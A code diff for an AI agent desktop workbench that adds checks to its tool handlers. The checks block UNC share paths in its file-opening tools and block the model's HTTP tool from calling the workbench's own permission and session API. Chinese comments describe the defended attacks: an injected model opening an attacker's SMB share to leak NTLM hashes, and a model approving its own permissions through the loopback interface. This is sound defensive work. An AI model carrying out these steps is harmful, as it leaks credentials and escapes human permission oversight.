@@ -2297,6 +2297,7 @@ const DESKTOP_TOOL_HANDLERS = {
   office_open: { paths: null, guardNote: "第36波录在案:不加读闸(打开不回流模型;exec tier 权限门);v1.4.6-S2 无 shell spawn", handler: async (args, ctx) => {
       // path 为空时 path.resolve('') 是【服务进程的当前目录】—— 修前会把它在资源管理器里打开。
       if (!String(args.path == null ? '' : args.path).trim()) return { ok: false, code: 'invalid_args', error: 'path 不能为空', hint: '传入要打开的文档 / 图片 / 文件夹的完整路径' };
+      if (await openToolUncDenied(args.path, ctx)) return { ok: false, code: 'not-allowed', error: UNC_DENIED_ERROR };
       const target = path.resolve(String(args.path || ''));
       // 只「打开」查看类文件(与 /api/file/reveal 同一张白名单 REVEAL_OPEN_SAFE_EXTS):修前 office_open 一个 .bat/.exe/.lnk
       // 就是交给关联程序【执行】—— allowCommandTools:false 时命令工具全关,这条路照样能跑脚本。其余扩展名只在资源管理器里
@@ -2334,6 +2335,12 @@ const NETWORK_TOOL_HANDLERS = {
       return webFetch(args, { signal: ctx && ctx.signal });   // 用户 Stop / 插话要能取消进行中的抓取
   } },
   http_request: { paths: null, guardNote: "纯网络调用,不触文件路径", handler: async (args, ctx) => {
+      // 3.0 收口走查(第四波):不许经这个工具调如意【自己】的本机接口 —— 那里有 /api/permission/decision、/api/tools/*、会话与记忆读接口,
+      // 模型经它就能自己批自己的权限、绕开文件闸读别的线程(token-browser 对无 Origin 的回环请求免 token)。与 04 剥掉桥接 MCP 的
+      // WCW_TOKEN 是同一条线。工作台内部的回环调用(agentToolLoopback 等)直接用 httpRequest,不经这个工具,不受影响。
+      if (httpRequestTargetsWorkbench(args && args.url)) {
+        return { ok: false, error: '不能用 http_request 调用如意自己的本机接口', failClass: 'blocked', hint: '要查看或操作如意自身的状态,请用对应的如意工具(例如 workbench_self_status),或请用户在界面上操作' };
+      }
       return httpRequest(args, { signal: ctx && ctx.signal });
   } },
   http_download: { paths: "write", guardNote: '', handler: async (args, ctx) => {
@@ -2425,6 +2432,7 @@ const NETWORK_TOOL_HANDLERS = {
       if (!target) return { ok: false, error: 'url is required', hint: '传一个 http(s) 网址或本地 .html 文件路径' };
       // 以 `-` 开头的值会被浏览器当成命令行开关(--renderer-cmd-prefix=… 这类),不是网址。
       if (target.startsWith('-')) return { ok: false, error: 'url 不能以 - 开头', target };
+      if (await openToolUncDenied(target, ctx)) return { ok: false, code: 'not-allowed', error: UNC_DENIED_ERROR, target };
       // 网址 / 本地 HTML 之外只放行【文件夹】(资源管理器打开)。修前 calc.exe、.bat 之类的路径会落到系统关联打开 = 执行。
       if (!isBrowserDocumentTarget(target)) {
         const st = await fsp.stat(path.resolve(target)).catch(() => null);
@@ -2554,6 +2562,51 @@ const CODE_TOOL_HANDLERS = {
       return dataProfile(p, args);
   } },
 };
+
+// 3.0 收口走查(第四波):打开类工具(office_open / browser_open)同样在【任何 I/O 之前】拒非本机 UNC(\\主机\共享、file://主机/共享)。
+// 修前它们不经 guardFileToolPath:智能自动档里 exec 工具默认放行,被注入的模型 office_open「\\攻击者\s\a.pdf」→ explorer 去连对方的 SMB,
+// 本机用户的 NTLM 哈希就递出去了(非安全扩展名那一支的 fsp.stat 也会先连)。判据与文件工具同一份(03 remoteUncDenialResolved:
+// 本机主机名不算外联、用户配成工作区的共享照旧放行)。http(s) 网址不在此列。返回命中的主机名,'' = 不拦。
+async function openToolUncDenied(rawTarget, ctx) {
+  const raw = String(rawTarget == null ? '' : rawTarget).trim();
+  if (!raw || /^https?:\/\//i.test(raw)) return '';
+  const candidates = [raw];
+  if (/^file:/i.test(raw)) {
+    try {
+      const u = new URL(raw);
+      if (u.hostname) candidates.push('\\\\' + u.hostname + decodeURIComponent(u.pathname).replace(/\//g, '\\'));
+    } catch { /* 解析不了的 file: 网址交给后面的打开逻辑报错 */ }
+  } else {
+    candidates.push(path.resolve(raw));
+  }
+  let config = ctx && ctx.config ? ctx.config : null;
+  if (!config) { try { config = await readConfig(); } catch { config = {}; } }
+  return remoteUncDenialResolved(candidates, (ctx && ctx.session) || null, config);
+}
+
+// 3.0 收口走查(第四波):url 是否落在如意自己的 HTTP 服务上 —— 端口等于本进程(serve)或父进程(MCP 子进程经 WCW_PORT)的监听端口,
+// 且主机是回环 / 未指定地址 / 本机名 / 本机网卡地址(--host 0.0.0.0 时局域网地址同样进得来)。主机先经 WHATWG URL 规范化,
+// 0x7f.1、2130706433、[::ffff:127.0.0.1] 这些写法都还原成标准形。解析不了 → false(交给 httpRequest 自己报错)。
+function httpRequestTargetsWorkbench(rawUrl) {
+  let u;
+  try { u = new URL(String(rawUrl == null ? '' : rawUrl).trim()); } catch { return false; }
+  if (u.protocol !== 'http:' && u.protocol !== 'https:') return false;
+  const port = Number(u.port || (u.protocol === 'https:' ? 443 : 80));
+  const own = [Number(process.env.WCW_PORT) || 0, Number(RUNTIME && RUNTIME.port) || 0].filter(Boolean);
+  if (!own.includes(port)) return false;
+  const host = u.hostname.replace(/^\[|\]$/g, '').replace(/\.+$/, '').toLowerCase();
+  if (!host) return false;
+  if (host === 'localhost' || host.endsWith('.localhost') || host === '::1' || host === '::' || host === '0.0.0.0' || /^127\./.test(host)) return true;
+  const v4 = embeddedIpv4FromV6(host);
+  if (v4 && (/^127\./.test(v4) || v4 === '0.0.0.0')) return true;
+  try { if (host === String(os.hostname() || '').toLowerCase()) return true; } catch { /* 取不到主机名就不按名字认 */ }
+  try {
+    for (const list of Object.values(os.networkInterfaces() || {})) {
+      for (const a of (list || [])) if (String(a && a.address || '').toLowerCase() === host) return true;
+    }
+  } catch { /* 取不到网卡表就只认回环 */ }
+  return false;
+}
 
 // 代理模式 v2:四个代理工具在 provider 回合内由 runOpenAiTurn 特判(需要活闭包);这里只处理【无回合上下文】的
 // 两种来路 —— Claude/Kimi 的一次性 MCP 子进程(回环 serve 进程的 /api/agent-workflow/*)与直接的 /api/tools 调用(拒绝)。
